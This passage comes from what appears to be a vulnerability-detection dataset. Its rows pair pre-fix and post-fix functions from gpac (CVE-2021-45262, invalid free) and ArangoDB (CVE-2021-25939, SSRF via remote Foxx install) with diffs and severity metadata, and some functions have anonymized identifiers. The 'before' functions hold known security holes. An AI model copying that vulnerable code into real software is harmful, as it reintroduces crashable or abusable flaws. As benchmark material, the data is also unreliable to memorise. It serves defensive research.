				VAR_3.far_ptr = (void *)&VAR_37;
				VAR_19 = VAR_29;
				VAR_40 = 1;
				break;
			default:
				VAR_39 = gf_lsr_anim_type_to_attribute(VAR_9);
				gf_node_get_attribute_by_tag(VAR_4, VAR_39, 1, 0, &VAR_3);
				VAR_19 = VAR_3.fieldType;
				break;
			}
			VAR_3.fieldType = VAR_19;
			if (VAR_40) {
				SVG_Transform *VAR_41;
				if (VAR_8==-1) {
					lsr_read_update_value(VAR_0, NULL, VAR_39, VAR_19, VAR_3.far_ptr, 0);
				} else {
					assert(0);
				}


/* COMMENT_6 */
				VAR_41 = (SVG_Transform *)VAR_3.far_ptr;
				if (VAR_2) {
					GF_Point2D VAR_42, VAR_43;
					SVG_Point_Angle VAR_44;
					if (gf_mx2d_decompose(&VAR_41->mat, &VAR_42, &VAR_44.angle, &VAR_43)) {
						gf_mx2d_init(VAR_41->mat);
						if (VAR_9==VAR_23) VAR_42 = VAR_37;
						else if (VAR_9==VAR_28) VAR_43 = VAR_37;
						else if (VAR_9==VAR_25) VAR_44 = VAR_38;

						gf_mx2d_add_scale(&VAR_41->mat, VAR_42.x, VAR_42.y);
						gf_mx2d_add_rotation(&VAR_41->mat, 0, 0, VAR_44.angle);
						gf_mx2d_add_translation(&VAR_41->mat, VAR_43.x, VAR_43.y);
					}
				}
				else if (VAR_9==VAR_23) gf_mx2d_add_scale(&VAR_41->mat, VAR_37.x, VAR_37.y);
				else if (VAR_9==VAR_28) gf_mx2d_add_translation(&VAR_41->mat, VAR_37.x, VAR_37.y);
				else if (VAR_9==VAR_25) gf_mx2d_add_rotation(&VAR_41->mat, 0, 0, VAR_38.angle);

				gf_node_changed((GF_Node*)VAR_4, &VAR_3);
			}
			else if (VAR_2) {
				if (VAR_20) {
					GF_DOMText *VAR_45 = NULL;
					if (VAR_8>=0) {
						if (VAR_2==VAR_36) {
							VAR_45 = gf_dom_new_text_node(VAR_4->sgprivate->scenegraph);
							gf_node_register((GF_Node *)VAR_45, VAR_4);
							gf_node_list_insert_child(&((GF_ParentNode *)VAR_4)->children, (GF_Node*)VAR_45, VAR_8);
						} else {
							VAR_45 = (GF_DOMText *) gf_node_list_get_child(((SVG_Element*)VAR_4)->children, VAR_8);
							if (VAR_45->sgprivate->tag!=VAR_46) VAR_45 = NULL;
						}
					} else {
						/* COMMENT_7 */
						gf_sg_parent_reset(VAR_4);
						VAR_45 = gf_dom_add_text_node(VAR_4, NULL);
					}
					lsr_read_byte_align_string(VAR_0, VAR_45 ? &VAR_45->textContent : NULL, ""textContent"");
					gf_node_changed(VAR_4, NULL);
				} else if (VAR_8==-1) {
					lsr_read_update_value(VAR_0, (GF_Node*)VAR_4, VAR_39, VAR_19, VAR_3.far_ptr, VAR_4->sgprivate->tag);
				} else {
					Fixed *VAR_47, *VAR_48;
					/* COMMENT_8 */
					void *VAR_49, *VAR_50;
					void *VAR_51 = lsr_read_update_value_indexed(VAR_0, (GF_Node*)VAR_4, VAR_19, VAR_3.far_ptr, VAR_8, VAR_2==VAR_36, 0, NULL);
					switch (VAR_19) {
					/* COMMENT_9 */
					case VAR_52/* COMMENT_10 */:
					case VAR_53/* COMMENT_11 */:
					case VAR_54/* COMMENT_12 */:
					case VAR_55/* COMMENT_13 */:
						VAR_50 = gf_list_pop_front(*(GF_List **)VAR_51);
						if (VAR_2==VAR_36) {
							gf_list_insert(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_50, VAR_8);
						} else {
							VAR_49 = gf_list_get(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_8);
							gf_free(VAR_49);
							gf_list_rem(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_8);
							gf_list_insert(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_50, VAR_8);
						}
						gf_node_changed((GF_Node*)VAR_4, NULL);
						gf_list_del(*(GF_List **)VAR_51);
						gf_free(VAR_51);
						break;
					/* COMMENT_14 */
					case VAR_56/* COMMENT_15 */:
						VAR_47 = (Fixed *) gf_list_pop_front(*(GF_List **)VAR_51);
						VAR_48 = (Fixed *) gf_list_pop_front(*(GF_List **)VAR_51);
						gf_list_del(*(GF_List **)VAR_51);
						gf_free(VAR_51);

						if (VAR_2==VAR_36) {
							gf_list_insert(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_47, VAR_8);
							gf_list_insert(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_48, VAR_8+1);
						} else {
							VAR_49 = gf_list_get(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_8);
							gf_free(VAR_49);
							gf_list_rem(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_8);
							VAR_49 = gf_list_get(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_8);
							gf_free(VAR_49);
							gf_list_rem(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_8);
							gf_list_insert(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_47, VAR_8);
							gf_list_insert(*(SVG_Coordinates*)VAR_3.far_ptr, VAR_48, VAR_8);
						}
						gf_node_changed((GF_Node*)VAR_4, NULL);
						break;
					case VAR_57:
						VAR_47 = (Fixed*)VAR_51;
						switch (VAR_8) {
						case 0:
							((SVG_ViewBox*)VAR_3.far_ptr)->x = *VAR_47;
							break;
						case 1:
							((SVG_ViewBox*)VAR_3.far_ptr)->y = *VAR_47;
							break;
						case 2:
							((SVG_ViewBox*)VAR_3.far_ptr)->width = *VAR_47;
							break;
						case 3:
							((SVG_ViewBox*)VAR_3.far_ptr)->height = *VAR_47;
							break;
						}
						gf_free(VAR_51);
						gf_node_changed((GF_Node*)VAR_4, NULL);
						break;
					case VAR_58:
						VAR_47 = (Fixed*)VAR_51;
						if (VAR_2==VAR_36) {
							SVG_StrokeDashArray*VAR_59 = (SVG_StrokeDashArray*)VAR_3.far_ptr;
							/* COMMENT_16 */
							if (gf_sg_vrml_mf_insert(&VAR_59->array, VAR_60, (void*) &VAR_48, VAR_8)==VAR_61)
								*VAR_48 = *VAR_47;
						} else {
							SVG_StrokeDashArray*VAR_59 = (SVG_StrokeDashArray*)VAR_3.far_ptr;
							if (VAR_8<(s32)VAR_59->array.count) VAR_59->array.vals[VAR_8] = *VAR_47;
						}
						gf_free(VAR_51);
						gf_node_changed((GF_Node*)VAR_4, NULL);
						break;
					default:
						gf_free(VAR_51);
						break;
					}
				}
			} else {
				GF_FieldInfo VAR_51;
				VAR_51 = VAR_3;
				if (VAR_8==-1) {
					VAR_51.far_ptr = gf_svg_create_attribute_value(VAR_3.fieldType);
					lsr_read_update_value(VAR_0, VAR_4, VAR_39, VAR_19, VAR_51.far_ptr, VAR_4->sgprivate->tag);
				} else {
					VAR_51.far_ptr = lsr_read_update_value_indexed(VAR_0, VAR_4, VAR_19, NULL, VAR_8, 0, 1, NULL);
				}
				gf_svg_attributes_add(&VAR_3, &VAR_51, &VAR_3, 0);
				gf_svg_delete_attribute_value(VAR_3.fieldType, VAR_51.far_ptr, gf_node_get_graph(VAR_4));
			}
		}
	}
	/* COMMENT_17 */
	else if (VAR_5 && (VAR_10>=0)) {
		u32 VAR_62 = gf_lsr_anim_type_to_attribute(VAR_10);
		if (VAR_1) {
			VAR_6 = gf_sg_command_new(VAR_0->sg, VAR_2 ? VAR_17 : VAR_21);
			gf_list_add(VAR_1, VAR_6);
			VAR_6->node = VAR_4;
			gf_node_register(VAR_6->node, NULL);
			VAR_6->fromNodeID = VAR_13;
			VAR_6->fromFieldIndex = VAR_62;
			VAR_7 = gf_sg_command_field_new(VAR_6);
			VAR_7->pos = VAR_8;
			VAR_7->fieldIndex = gf_lsr_anim_type_to_attribute(VAR_9);
		} else {
			u32 VAR_39;
			GF_FieldInfo VAR_63;
			VAR_39 = gf_lsr_anim_type_to_attribute(VAR_9);
			gf_node_get_field(VAR_4, VAR_39, &VAR_3);
			gf_node_get_field(VAR_5, VAR_62, &VAR_63);
			if (VAR_2) {
				gf_svg_attributes_copy(&VAR_3, &VAR_63, 0);
			} else {
				gf_svg_attributes_add(&VAR_3, &VAR_63, &VAR_3, 0);
			}
		}
	}

	lsr_read_any_attribute(VAR_0, NULL, 1);

	/* COMMENT_18 */
	if (!VAR_2) return VAR_61;

	/* COMMENT_19 */
	GF_LSR_READ_INT(VAR_0, VAR_11, 1, ""opt_group"");
	if (VAR_11) {

		if (VAR_1) {
			u32 VAR_64;
			GF_ChildNodeItem *VAR_65 = NULL;

			if (VAR_2==VAR_36) VAR_64 = 1;
			else VAR_64 = lsr_read_vluimsbf5(VAR_0, ""count"");

			VAR_6 = gf_sg_command_new(VAR_0->sg, (VAR_2==VAR_66) ? VAR_17 : VAR_16);
			gf_list_add(VAR_1, VAR_6);
			VAR_6->node = VAR_4;
			gf_node_register(VAR_6->node, NULL);
			VAR_7 = gf_sg_command_field_new(VAR_6);
			VAR_7->pos = VAR_8;

			if (!VAR_64 && (VAR_9==VAR_22)) {
				VAR_7->fieldIndex = -1;
			} else if (VAR_64==1) {
				VAR_7->new_node = lsr_read_update_content_model(VAR_0, (SVG_Element *) VAR_4);
				gf_node_register(VAR_7->new_node, NULL);
				if (VAR_9>=0) VAR_7->fieldIndex = gf_lsr_anim_type_to_attribute(VAR_9);
			} else {
				VAR_7->fieldType = VAR_67;
				VAR_7->field_ptr = &VAR_7->node_list;
				while (VAR_64) {
					GF_Node *VAR_15 = lsr_read_update_content_model(VAR_0, (SVG_Element *) VAR_4);
					gf_node_register(VAR_15, NULL);
					gf_node_list_add_child_last(& VAR_7->node_list, VAR_15, &VAR_65);
					VAR_64--;
				}
			}
		} else {
			SVG_Element*VAR_68 = (SVG_Element*)VAR_4;
			GF_ChildNodeItem *VAR_65 = NULL;
			u32 VAR_64;
			if (VAR_2==VAR_36) VAR_64 = 1;
			else VAR_64 = lsr_read_vluimsbf5(VAR_0, ""count"");

			if (VAR_2==VAR_66) {
				if (VAR_8>=0) {
					GF_Node *VAR_15 = gf_node_list_del_child_idx(&VAR_68->children, VAR_8);
					if (VAR_15) gf_node_unregister(VAR_15, VAR_4);
				} else {
					gf_node_unregister_children(VAR_4, VAR_68->children);
					VAR_68->children = NULL;
				}
			}
			if ((VAR_2==VAR_36) || (gf_lsr_anim_type_to_attribute(VAR_9) == VAR_69)) {
				while (VAR_64) {
					GF_Node *VAR_15 = lsr_read_update_content_model(VAR_0, VAR_68);
					if (VAR_15) {
						if (VAR_8>=0) {
							gf_node_list_insert_child(&VAR_68->children, VAR_15, VAR_8);
						} else {
							gf_node_list_add_child_last(&VAR_68->children, VAR_15, &VAR_65);
						}
						gf_node_register(VAR_15, VAR_4);
					}
					VAR_64--;
				}
				gf_node_changed(VAR_4, NULL);
			}
			/* COMMENT_2 */
			else if ((VAR_9==-1) && (VAR_64==1)) {
				GF_Node *VAR_15 = lsr_read_update_content_model(VAR_0, VAR_68);
				gf_node_replace((GF_Node*)VAR_68, VAR_15, 0);
			}
		}
	}
	return VAR_61;
}",gpac/ef86a8eba3b166b885dec219066dd3a47501e03a/lsr_dec.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -397,6 +397,7 @@
 				gf_node_register(field->new_node, NULL);
 				if (att_type>=0) field->fieldIndex = gf_lsr_anim_type_to_attribute(att_type);
 			} else {
+				field->fieldType = SVG_NodeList_datatype;
 				field->field_ptr = &field->node_list;
 				while (count) {
 					GF_Node *new_node = lsr_read_update_content_model(lsr, (SVG_Element *) n);","{'deleted_lines': [], 'added_lines': ['\t\t\t\tfield->fieldType = SVG_NodeList_datatype;']}",True,"An invalid free vulnerability exists in gpac 1.1.0 via the gf_sg_command_del function, which causes a segmentation fault and application crash.",5.5,MEDIUM,1,valid,2021-12-13T13:21:50Z,4
CVE-2021-45262,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #1980,ef86a8eba3b166b885dec219066dd3a47501e03a,https://github.com/gpac/gpac/commit/ef86a8eba3b166b885dec219066dd3a47501e03a,src/scenegraph/svg_types.c,gf_svg_delete_attribute_value,"void gf_svg_delete_attribute_value(u32 type, void *value, GF_SceneGraph *sg)
{
GF_List *l;
switch (type) {
case SVG_Paint_datatype:
gf_svg_delete_paint(sg, (SVG_Paint *)value);
break;
case XMLRI_datatype:
case XML_IDREF_datatype:
gf_svg_reset_iri(sg, (XMLRI *)value);
gf_free(value);
break;
case SVG_Focus_datatype:
gf_svg_reset_iri(sg, & ((SVG_Focus*)value)->target);
gf_free(value);
break;
case SVG_ClipPath_datatype:
gf_svg_reset_iri(sg, & ((SVG_ClipPath*)value)->target);
gf_free(value);
break;
case SVG_PathData_datatype:
#if USE_GF_PATH
gf_path_del((GF_Path *)value);
#else
gf_free(value);
#endif
break;
case SVG_ID_datatype:
case DOM_String_datatype:
case SVG_ContentType_datatype:
case SVG_LanguageID_datatype:
if (*(SVG_String *)value) gf_free(*(SVG_String *)value);
gf_free(value);
break;
case SVG_StrokeDashArray_datatype:
if (((SVG_StrokeDashArray*)value)->array.vals) gf_free(((SVG_StrokeDashArray*)value)->array.vals);
if (((SVG_StrokeDashArray*)value)->array.units) gf_free(((SVG_StrokeDashArray*)value)->array.units);
gf_free(value);
break;
case SMIL_KeyTimes_datatype:
case SMIL_KeyPoints_datatype:
case SMIL_KeySplines_datatype:
case SVG_Numbers_datatype:
case SVG_Coordinates_datatype:
case SVG_Points_datatype:
l = *(GF_List**)value;
while (gf_list_count(l)) {
void *n = gf_list_last(l);
gf_list_rem_last(l);
gf_free(n);
}
gf_list_del(l);
gf_free(value);
break;
case SVG_FontFamily_datatype:
{
SVG_FontFamily *ff = (SVG_FontFamily *)value;
if (ff->value) gf_free(ff->value);
gf_free(value);
}
break;
case SMIL_AttributeName_datatype:
{
SMIL_AttributeName *an = (SMIL_AttributeName *)value;
if (an->name) gf_free(an->name);
gf_free(value);
}
break;
case SMIL_Times_datatype:
gf_smil_delete_times(*(SMIL_Times *)value);
gf_free(value);
break;
case SMIL_AnimateValue_datatype:
svg_delete_one_anim_value(((SMIL_AnimateValue *)value)->type, ((SMIL_AnimateValue *)value)->value, sg);
gf_free(value);
break;
case SMIL_AnimateValues_datatype:
gf_svg_reset_animate_values(*((SMIL_AnimateValues *)value), sg);
gf_free(value);
break;
case DOM_StringList_datatype:
l = *(GF_List**)value;
while (gf_list_count(l)) {
char *n = gf_list_last(l);
gf_list_rem_last(l);
gf_free(n);
}
gf_list_del(l);
gf_free(value);
break;
case XMLRI_List_datatype:
l = *(GF_List**)value;
while (gf_list_count(l)) {
XMLRI *r = gf_list_last(l);
gf_list_rem_last(l);
if (r->string) gf_free(r->string);
gf_free(r);
}
gf_list_del(l);
gf_free(value);
break;
case 0:
if (*(SVG_String *)value) gf_free(*(SVG_String *)value);
gf_free(value);
break;
case SMIL_RepeatCount_datatype:
case SMIL_Duration_datatype:
case SVG_Length_datatype:
case SVG_Coordinate_datatype:
case SVG_Visibility_datatype:
case SVG_Display_datatype:
default:
gf_free(value);
break;
}
}","void gf_svg_delete_attribute_value(u32 VAR_0, void *VAR_1, GF_SceneGraph *VAR_2)
{
GF_List *VAR_3;
switch (VAR_0) {
case VAR_4:
gf_svg_delete_paint(VAR_2, (SVG_Paint *)VAR_1);
break;
case VAR_5:
case VAR_6:
gf_svg_reset_iri(VAR_2, (XMLRI *)VAR_1);
gf_free(VAR_1);
break;
case VAR_7:
gf_svg_reset_iri(VAR_2, & ((SVG_Focus*)VAR_1)->target);
gf_free(VAR_1);
break;
case VAR_8:
gf_svg_reset_iri(VAR_2, & ((SVG_ClipPath*)VAR_1)->target);
gf_free(VAR_1);
break;
case VAR_9:
#if VAR_10
gf_path_del((GF_Path *)VAR_1);
#else
gf_free(VAR_1);
#endif
break;
case VAR_11:
case VAR_12:
case VAR_13:
case VAR_14:
if (*(SVG_String *)VAR_1) gf_free(*(SVG_String *)VAR_1);
gf_free(VAR_1);
break;
case VAR_15:
if (((SVG_StrokeDashArray*)VAR_1)->array.vals) gf_free(((SVG_StrokeDashArray*)VAR_1)->array.vals);
if (((SVG_StrokeDashArray*)VAR_1)->array.units) gf_free(((SVG_StrokeDashArray*)VAR_1)->array.units);
gf_free(VAR_1);
break;
case VAR_16:
case VAR_17:
case VAR_18:
case VAR_19:
case VAR_20:
case VAR_21:
VAR_3 = *(GF_List**)VAR_1;
while (gf_list_count(VAR_3)) {
void *VAR_22 = gf_list_last(VAR_3);
gf_list_rem_last(VAR_3);
gf_free(VAR_22);
}
gf_list_del(VAR_3);
gf_free(VAR_1);
break;
case VAR_23:
{
SVG_FontFamily *VAR_24 = (SVG_FontFamily *)VAR_1;
if (VAR_24->value) gf_free(VAR_24->value);
gf_free(VAR_1);
}
break;
case VAR_25:
{
SMIL_AttributeName *VAR_26 = (SMIL_AttributeName *)VAR_1;
if (VAR_26->name) gf_free(VAR_26->name);
gf_free(VAR_1);
}
break;
case VAR_27:
gf_smil_delete_times(*(SMIL_Times *)VAR_1);
gf_free(VAR_1);
break;
case VAR_28:
svg_delete_one_anim_value(((SMIL_AnimateValue *)VAR_1)->type, ((SMIL_AnimateValue *)VAR_1)->value, VAR_2);
gf_free(VAR_1);
break;
case VAR_29:
gf_svg_reset_animate_values(*((SMIL_AnimateValues *)VAR_1), VAR_2);
gf_free(VAR_1);
break;
case VAR_30:
VAR_3 = *(GF_List**)VAR_1;
while (gf_list_count(VAR_3)) {
char *VAR_22 = gf_list_last(VAR_3);
gf_list_rem_last(VAR_3);
gf_free(VAR_22);
}
gf_list_del(VAR_3);
gf_free(VAR_1);
break;
case VAR_31:
VAR_3 = *(GF_List**)VAR_1;
while (gf_list_count(VAR_3)) {
XMLRI *VAR_32 = gf_list_last(VAR_3);
gf_list_rem_last(VAR_3);
if (VAR_32->string) gf_free(VAR_32->string);
gf_free(VAR_32);
}
gf_list_del(VAR_3);
gf_free(VAR_1);
break;
case 0:
if (*(SVG_String *)VAR_1) gf_free(*(SVG_String *)VAR_1);
gf_free(VAR_1);
break;
case VAR_33:
case VAR_34:
case VAR_35:
case VAR_36:
case VAR_37:
case VAR_38:
default:
gf_free(VAR_1);
break;
}
}",gpac/ef86a8eba3b166b885dec219066dd3a47501e03a/svg_types.c/vul/before/0.json,"void gf_svg_delete_attribute_value(u32 type, void *value, GF_SceneGraph *sg)
{
	GF_List *l;
	switch (type) {
	case SVG_Paint_datatype:
		gf_svg_delete_paint(sg, (SVG_Paint *)value);
		break;
	case XMLRI_datatype:
	case XML_IDREF_datatype:
		gf_svg_reset_iri(sg, (XMLRI *)value);
		gf_free(value);
		break;
	case SVG_Focus_datatype:
		gf_svg_reset_iri(sg, & ((SVG_Focus*)value)->target);
		gf_free(value);
		break;
	case SVG_ClipPath_datatype:
		gf_svg_reset_iri(sg, & ((SVG_ClipPath*)value)->target);
		gf_free(value);
		break;
	case SVG_PathData_datatype:
#if USE_GF_PATH
		gf_path_del((GF_Path *)value);
#else
		gf_free(value);
#endif
		break;
	case SVG_ID_datatype:
	case DOM_String_datatype:
	case SVG_ContentType_datatype:
	case SVG_LanguageID_datatype:
		if (*(SVG_String *)value) gf_free(*(SVG_String *)value);
		gf_free(value);
		break;
	case SVG_StrokeDashArray_datatype:
		if (((SVG_StrokeDashArray*)value)->array.vals) gf_free(((SVG_StrokeDashArray*)value)->array.vals);
		if (((SVG_StrokeDashArray*)value)->array.units) gf_free(((SVG_StrokeDashArray*)value)->array.units);
		gf_free(value);
		break;
	case SMIL_KeyTimes_datatype:
	case SMIL_KeyPoints_datatype:
	case SMIL_KeySplines_datatype:
	case SVG_Numbers_datatype:
	case SVG_Coordinates_datatype:
	case SVG_Points_datatype:
		l = *(GF_List**)value;
		while (gf_list_count(l)) {
			void *n = gf_list_last(l);
			gf_list_rem_last(l);
			gf_free(n);
		}
		gf_list_del(l);
		gf_free(value);
		break;
	case SVG_FontFamily_datatype:
	{
		SVG_FontFamily *ff = (SVG_FontFamily *)value;
		if (ff->value) gf_free(ff->value);
		gf_free(value);
	}
	break;
	case SMIL_AttributeName_datatype:
	{
		SMIL_AttributeName *an = (SMIL_AttributeName *)value;
		if (an->name) gf_free(an->name);
		gf_free(value);
	}
	break;
	case SMIL_Times_datatype:
		gf_smil_delete_times(*(SMIL_Times *)value);
		gf_free(value);
		break;
	case SMIL_AnimateValue_datatype:
		svg_delete_one_anim_value(((SMIL_AnimateValue *)value)->type, ((SMIL_AnimateValue *)value)->value, sg);
		gf_free(value);
		break;
	case SMIL_AnimateValues_datatype:
		gf_svg_reset_animate_values(*((SMIL_AnimateValues *)value), sg);
		gf_free(value);
		break;
	case DOM_StringList_datatype:
		l = *(GF_List**)value;
		while (gf_list_count(l)) {
			char *n = gf_list_last(l);
			gf_list_rem_last(l);
			gf_free(n);
		}
		gf_list_del(l);
		gf_free(value);
		break;
	case XMLRI_List_datatype:
		l = *(GF_List**)value;
		while (gf_list_count(l)) {
			XMLRI *r = gf_list_last(l);
			gf_list_rem_last(l);
			if (r->string) gf_free(r->string);
			gf_free(r);
		}
		gf_list_del(l);
		gf_free(value);
		break;

	case 0:
		if (*(SVG_String *)value) gf_free(*(SVG_String *)value);
		gf_free(value);
		break;
	case SVG_NodeList_datatype:
		break;
	case SMIL_RepeatCount_datatype:
	case SMIL_Duration_datatype:
	case SVG_Length_datatype:
	case SVG_Coordinate_datatype:
	case SVG_Visibility_datatype:
	case SVG_Display_datatype:
	default:
		gf_free(value);
		break;
	}
}","void gf_svg_delete_attribute_value(u32 VAR_0, void *VAR_1, GF_SceneGraph *VAR_2)
{
	GF_List *VAR_3;
	switch (VAR_0) {
	case VAR_4:
		gf_svg_delete_paint(VAR_2, (SVG_Paint *)VAR_1);
		break;
	case VAR_5:
	case VAR_6:
		gf_svg_reset_iri(VAR_2, (XMLRI *)VAR_1);
		gf_free(VAR_1);
		break;
	case VAR_7:
		gf_svg_reset_iri(VAR_2, & ((SVG_Focus*)VAR_1)->target);
		gf_free(VAR_1);
		break;
	case VAR_8:
		gf_svg_reset_iri(VAR_2, & ((SVG_ClipPath*)VAR_1)->target);
		gf_free(VAR_1);
		break;
	case VAR_9:
#if VAR_10
		gf_path_del((GF_Path *)VAR_1);
#else
		gf_free(VAR_1);
#endif
		break;
	case VAR_11:
	case VAR_12:
	case VAR_13:
	case VAR_14:
		if (*(SVG_String *)VAR_1) gf_free(*(SVG_String *)VAR_1);
		gf_free(VAR_1);
		break;
	case VAR_15:
		if (((SVG_StrokeDashArray*)VAR_1)->array.vals) gf_free(((SVG_StrokeDashArray*)VAR_1)->array.vals);
		if (((SVG_StrokeDashArray*)VAR_1)->array.units) gf_free(((SVG_StrokeDashArray*)VAR_1)->array.units);
		gf_free(VAR_1);
		break;
	case VAR_16:
	case VAR_17:
	case VAR_18:
	case VAR_19:
	case VAR_20:
	case VAR_21:
		VAR_3 = *(GF_List**)VAR_1;
		while (gf_list_count(VAR_3)) {
			void *VAR_22 = gf_list_last(VAR_3);
			gf_list_rem_last(VAR_3);
			gf_free(VAR_22);
		}
		gf_list_del(VAR_3);
		gf_free(VAR_1);
		break;
	case VAR_23:
	{
		SVG_FontFamily *VAR_24 = (SVG_FontFamily *)VAR_1;
		if (VAR_24->value) gf_free(VAR_24->value);
		gf_free(VAR_1);
	}
	break;
	case VAR_25:
	{
		SMIL_AttributeName *VAR_26 = (SMIL_AttributeName *)VAR_1;
		if (VAR_26->name) gf_free(VAR_26->name);
		gf_free(VAR_1);
	}
	break;
	case VAR_27:
		gf_smil_delete_times(*(SMIL_Times *)VAR_1);
		gf_free(VAR_1);
		break;
	case VAR_28:
		svg_delete_one_anim_value(((SMIL_AnimateValue *)VAR_1)->type, ((SMIL_AnimateValue *)VAR_1)->value, VAR_2);
		gf_free(VAR_1);
		break;
	case VAR_29:
		gf_svg_reset_animate_values(*((SMIL_AnimateValues *)VAR_1), VAR_2);
		gf_free(VAR_1);
		break;
	case VAR_30:
		VAR_3 = *(GF_List**)VAR_1;
		while (gf_list_count(VAR_3)) {
			char *VAR_22 = gf_list_last(VAR_3);
			gf_list_rem_last(VAR_3);
			gf_free(VAR_22);
		}
		gf_list_del(VAR_3);
		gf_free(VAR_1);
		break;
	case VAR_31:
		VAR_3 = *(GF_List**)VAR_1;
		while (gf_list_count(VAR_3)) {
			XMLRI *VAR_32 = gf_list_last(VAR_3);
			gf_list_rem_last(VAR_3);
			if (VAR_32->string) gf_free(VAR_32->string);
			gf_free(VAR_32);
		}
		gf_list_del(VAR_3);
		gf_free(VAR_1);
		break;

	case 0:
		if (*(SVG_String *)VAR_1) gf_free(*(SVG_String *)VAR_1);
		gf_free(VAR_1);
		break;
	case VAR_33:
		break;
	case VAR_34:
	case VAR_35:
	case VAR_36:
	case VAR_37:
	case VAR_38:
	case VAR_39:
	default:
		gf_free(VAR_1);
		break;
	}
}",gpac/ef86a8eba3b166b885dec219066dd3a47501e03a/svg_types.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -104,6 +104,8 @@
 		if (*(SVG_String *)value) gf_free(*(SVG_String *)value);
 		gf_free(value);
 		break;
+	case SVG_NodeList_datatype:
+		break;
 	case SMIL_RepeatCount_datatype:
 	case SMIL_Duration_datatype:
 	case SVG_Length_datatype:","{'deleted_lines': [], 'added_lines': ['\tcase SVG_NodeList_datatype:', '\t\tbreak;']}",True,"An invalid free vulnerability exists in gpac 1.1.0 via the gf_sg_command_del function, which causes a segmentation fault and application crash.",5.5,MEDIUM,1,valid,2021-12-13T13:21:50Z,4
CVE-2021-25939,['CWE-918'],AV:N/AC:L/Au:S/C:N/I:P/A:N,0,arangodb,[APM-78] Disable installation from remote URL (#15292),d9b7f019d2435f107b19a59190bf9cc27d5f34dd,https://github.com/arangodb/arangodb/commit/d9b7f019d2435f107b19a59190bf9cc27d5f34dd,arangod/GeneralServer/ServerSecurityFeature.cpp,ServerSecurityFeature::collectOptions,"void ServerSecurityFeature::collectOptions(std::shared_ptr<ProgramOptions> options) {
options->addOption(""--server.harden"",
""lock down REST APIs that reveal version information or server ""
""internals for non-admin users"",
new BooleanParameter(&_hardenedRestApi))
.setIntroducedIn(30500);
options->addOption(""--foxx.api"", ""enables Foxx management REST APIs"",
new BooleanParameter(&_enableFoxxApi),
arangodb::options::makeFlags(
arangodb::options::Flags::DefaultNoComponents,
arangodb::options::Flags::OnCoordinator,
arangodb::options::Flags::OnSingle))
.setIntroducedIn(30500);
options->addOption(""--foxx.store"", ""enables Foxx store in web interface"",
new BooleanParameter(&_enableFoxxStore),
arangodb::options::makeFlags(
arangodb::options::Flags::DefaultNoComponents,
arangodb::options::Flags::OnCoordinator,
arangodb::options::Flags::OnSingle))
.setIntroducedIn(30500);
}","void ServerSecurityFeature::collectOptions(std::shared_ptr<ProgramOptions> VAR_0) {
VAR_0->addOption(""--server.harden"",
""lock down REST APIs that reveal version information or server ""
""internals for non-admin users"",
new BooleanParameter(&VAR_1))
.setIntroducedIn(30500);
VAR_0->addOption(""--foxx.api"", ""enables Foxx management REST APIs"",
new BooleanParameter(&VAR_2),
arangodb::options::makeFlags(
arangodb::options::Flags::DefaultNoComponents,
arangodb::options::Flags::OnCoordinator,
arangodb::options::Flags::OnSingle))
.setIntroducedIn(30500);
VAR_0->addOption(""--foxx.store"", ""enables Foxx store in web interface"",
new BooleanParameter(&VAR_3),
arangodb::options::makeFlags(
arangodb::options::Flags::DefaultNoComponents,
arangodb::options::Flags::OnCoordinator,
arangodb::options::Flags::OnSingle))
.setIntroducedIn(30500);
}",arangodb/d9b7f019d2435f107b19a59190bf9cc27d5f34dd/ServerSecurityFeature.cpp/vul/before/0.json,"void ServerSecurityFeature::collectOptions(std::shared_ptr<ProgramOptions> options) {
  options->addOption(""--server.harden"",
                     ""lock down REST APIs that reveal version information or server ""
                     ""internals for non-admin users"",
                     new BooleanParameter(&_hardenedRestApi))
                     .setIntroducedIn(30500);

  options->addOption(""--foxx.api"", ""enables Foxx management REST APIs"",
                     new BooleanParameter(&_enableFoxxApi),
                     arangodb::options::makeFlags(
                     arangodb::options::Flags::DefaultNoComponents,
                     arangodb::options::Flags::OnCoordinator,
                     arangodb::options::Flags::OnSingle))
                     .setIntroducedIn(30500);

  options->addOption(""--foxx.store"", ""enables Foxx store in web interface"",
                     new BooleanParameter(&_enableFoxxStore),
                     arangodb::options::makeFlags(
                     arangodb::options::Flags::DefaultNoComponents,
                     arangodb::options::Flags::OnCoordinator,
                     arangodb::options::Flags::OnSingle))
                     .setIntroducedIn(30500);
  
  options->addOption(""--foxx.allow-install-from-remote"", ""allow installing Foxx apps from remote URLs other than Github"",
                     new BooleanParameter(&_foxxAllowInstallFromRemote),
                     arangodb::options::makeFlags(
                     arangodb::options::Flags::DefaultNoComponents,
                     arangodb::options::Flags::OnCoordinator,
                     arangodb::options::Flags::OnSingle))
                     .setIntroducedIn(30805);
}","void ServerSecurityFeature::collectOptions(std::shared_ptr<ProgramOptions> VAR_0) {
  VAR_0->addOption(""--server.harden"",
                     ""lock down REST APIs that reveal version information or server ""
                     ""internals for non-admin users"",
                     new BooleanParameter(&VAR_1))
                     .setIntroducedIn(30500);

  VAR_0->addOption(""--foxx.api"", ""enables Foxx management REST APIs"",
                     new BooleanParameter(&VAR_2),
                     arangodb::options::makeFlags(
                     arangodb::options::Flags::DefaultNoComponents,
                     arangodb::options::Flags::OnCoordinator,
                     arangodb::options::Flags::OnSingle))
                     .setIntroducedIn(30500);

  VAR_0->addOption(""--foxx.store"", ""enables Foxx store in web interface"",
                     new BooleanParameter(&VAR_3),
                     arangodb::options::makeFlags(
                     arangodb::options::Flags::DefaultNoComponents,
                     arangodb::options::Flags::OnCoordinator,
                     arangodb::options::Flags::OnSingle))
                     .setIntroducedIn(30500);
  
  VAR_0->addOption(""--foxx.allow-install-from-remote"", ""allow installing Foxx apps from remote URLs other than Github"",
                     new BooleanParameter(&VAR_4),
